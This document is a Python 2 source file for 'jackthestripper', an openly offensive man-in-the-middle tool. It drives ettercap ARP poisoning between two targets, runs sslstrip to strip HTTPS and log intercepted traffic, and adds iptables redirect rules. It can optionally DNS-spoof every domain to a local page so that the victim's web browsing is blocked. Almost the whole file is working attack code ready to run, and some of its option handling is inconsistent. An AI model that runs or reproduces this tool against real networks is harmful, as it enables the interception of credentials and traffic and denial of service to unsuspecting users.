#!/usr/bin/python2.7
# Script to perform MITM (Man In The Middle) attacks using ARP poisoning to intercept all messages going between two targets.
# @depends iptables; ettercap; sslstrip.
#
# @authors 
# Cascudo <lucas.redeaberta.com.br>; 
# Elfotux <elfotux@gmail.com>;
# Neko <nekoone@riseup.net>;
# UserX <user_x@riseup.net>;
# Code <code@riseup.net>.
#
# @born 2014-10-19

import sys, numpy, getopt, subprocess

#Splash
print "     ____.              __     ___________.__            "
print "    |    |____    ____ |  | __ \__    ___/|  |__   ____  "
print "    |    \__  \ _/ ___\|  |/ /   |    |   |  |  \_/ __ \ "
print '/\__|    |/ __ \\\\  \___|    <    |    |   |   Y  \  ___/ '
print "\________(____  /\___  >__|_ \   |____|   |___|  /\___  >"
print "              \/     \/     \/                 \/     \/ "
print "  _________ __         .__                               "
print " /   _____//  |________|__|_____ ______   ___________    "
print " \_____  \\\\   __\_  __ \  \____ \\\\____ \_/ __ \_  __ \   "
print " /        \|  |  |  | \/  |  |_> >  |_> >  ___/|  | \/   "
print "/_______  /|__|  |__|  |__|   __/|   __/ \___  >__|      "
print "        \/                |__|   |__|        \/          "
#Splash
	
def introduceYourself():
	'Examples'
	print 'Example 1: jackthestripper'
	print 'Example 2: jackthestripper -i wlan0 --ap 10.0.0.1 --t 10.0.0.3 --block-web-browsing --remote-browser --dns-spoof'
	sys.exit(0)

def checkCompliance(requirements):
	'Looks for broken dependencies'
	isCompliant = True
	if output.strip() != 'root':
		isCompliant = False
		print 'This script must be run as root.'
	for r in requirements:
   		try:
			p = subprocess.Popen(r[0], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
		except OSError:
			isCompliant = False
			print r[0][0] + ' was not found. Please install it before proceed.'
	if not isCompliant:
		sys.exit(2)

def setParams():
	'Sets necessary parameters'
	global networkInterface, target1, target2, useRemoteBrowser, useDnsSpoof, blockWebBrowsing
	try:                                
		opts, args = getopt.getopt(sys.argv[1:], "i:h", ["block-web-browsing", "dns-spoof", "help", "remote-browser", "t1=", "t2="])
	except getopt.GetoptError:
		pass
	for opt, arg in opts:
		if opt == '-h' or opt == '--help' : introduceYourself()
		elif opt == '-i': networkInterface = arg
		elif opt == '--remote-browser': useRemoteBrowser = 'Y'
		elif opt == '--dns-spoof': useDnsSpoof = 'Y'
		elif opt == '--block-web-browsing': blockWebBrowsing = 'Y'
		elif opt == '--ap': target1 = arg
		elif opt == '--t': target2 = arg
	if networkInterface == '': networkInterface = raw_input('Choose a network interface: ')
	if target1 == '': target1 = raw_input('Insert target 1: ')
	if target2 == '': target2 = raw_input('Insert target 2: ')
	if useRemoteBrowser == '': useRemoteBrowser = raw_input('Enable remote_browser plugin? (y/n) ')
	if blockWebBrowsing == '': blockWebBrowsing = raw_input('Block victim\'s web browsing (Denial of Service)? (y/n) ')
	if blockWebBrowsing == 'Y' or blockWebBrowsing == 'y': useDnsSpoof = blockWebBrowsing
	elif useDnsSpoof == '': useDnsSpoof = raw_input('Enable dns_spoof plugin? (y/n) ')

def transpose():
	'Sets necessary HTTP and HTTPS firewall redirection rules'
	portsToCheck = [['http', '80'],['https', '443']]
	for p in portsToCheck:
		p1 = subprocess.Popen(['iptables', '-L', '-t', 'nat'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
		p2 = subprocess.Popen(['grep', 'dpt:' + p[0] + ' redir ports 10000'], stdin=p1.stdout, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
		p1.stdout.close()
		output, errors = p2.communicate()
		p2.stdout.close()
		if output == "":
			subprocess.call(['iptables', '-t', 'nat', '-A', 'PREROUTING', '-i', networkInterface, '-p', 'tcp', '--dport', p[1], '-j', 'REDIRECT', '--to-port', '10000'])

def getIpAddress(ifname):
	import socket, struct, fcntl
	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	return socket.inet_ntoa(fcntl.ioctl(
    	s.fileno(),
		0x8915,  # SIOCGIFADDR
		struct.pack('256s', ifname[:15])
	)[20:24])

def block():
	'Replaces all browsed pages with a pirate flag'
	import tarfile, os, shutil
	global networkInterface
	wwwroot = ''
	if os.path.isdir("/var/www/html"): wwwroot = "/var/www/html"
	elif os.path.isdir("/var/www"): wwwroot = "/var/www"
	if wwwroot == '':
		print 'Could not find a valid Apache path, please install apache2 or httpd before proceed'
		sys.exit(2)
	else:
		tar = tarfile.open("flag.tar.gz")
		tar.extractall()
		tar.close()
		os.rename('index.html', wwwroot + '/index.html')
		os.rename('flag.mp4', wwwroot + '/flag.mp4')
		dnsFile = open('etter.dns', 'w+')
		dnsFile.write('*.* A ' + getIpAddress(networkInterface))
		dnsFile.close()
		shutil.copy2('etter.dns', '/usr/share/ettercap/etter.dns')
		os.rename('etter.dns', '/etc/ettercap/etter.dns')
		p1 = subprocess.Popen(['service', 'apache2', 'start'])
		p1 = subprocess.Popen(['service', 'httpd', 'start'])
		subprocess.call(['iptables', '-t', 'nat', '-F'])
		subprocess.call(['iptables', '-F', 'INPUT'])
		subprocess.call(['iptables', '-A', 'INPUT', '-p', 'tcp', '--dport', '80', '-j', 'ACCEPT'])

def staple():
	'Performs the MITM attack'
	print 'Monitoring traffic between ' + target1 + ' and ' + target2 + ' using interface: '+ networkInterface + '.'
	p = subprocess.Popen(['date', '+%Y%m%d_%H%M%S'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	logId, errors = p.communicate()
	logId = logId.strip()
	ettercapCommand = ['ettercap', '-p', '-i', networkInterface, '-T', '-q', '-M', 'arp:remote', '/'+ target1 + '//', '/' + target2 + '//', '-w', 'ettercap_' + logId + '.pcap']
	if useRemoteBrowser == 'y' or useRemoteBrowser == 'Y':
		ettercapCommand = numpy.concatenate([ettercapCommand, ['-P', 'remote_browser']])
	if useDnsSpoof == 'y' or useDnsSpoof == 'Y':
		ettercapCommand = numpy.concatenate([ettercapCommand, ['-P', 'dns_spoof']])
	if blockWebBrowsing != 'y' and blockWebBrowsing != 'Y':
		subprocess.Popen(['sslstrip', '-k', '-f', '-w', 'sslstrip_' + logId + '.log'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	subprocess.call(ettercapCommand)
	print 'ettercap Stopped. Stopping sslstrip.'
	print 'Logs and capture files were created at current directory.'
	if blockWebBrowsing != 'y' and blockWebBrowsing != 'Y':
		subprocess.call(['killall', 'sslstrip'])

networkInterface = target1 = target2 = useRemoteBrowser = useDnsSpoof = blockWebBrowsing = '';
requirements = [
	[['ettercap', '-v']],
	[['iptables', '--version']],
	[['sslstrip', '-h']]
]
p = subprocess.Popen(['whoami'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
output, errors = p.communicate()
setParams()
checkCompliance(requirements)
if blockWebBrowsing == 'y' or blockWebBrowsing == 'Y': block()
else: transpose()
staple()

# That's All Folks!
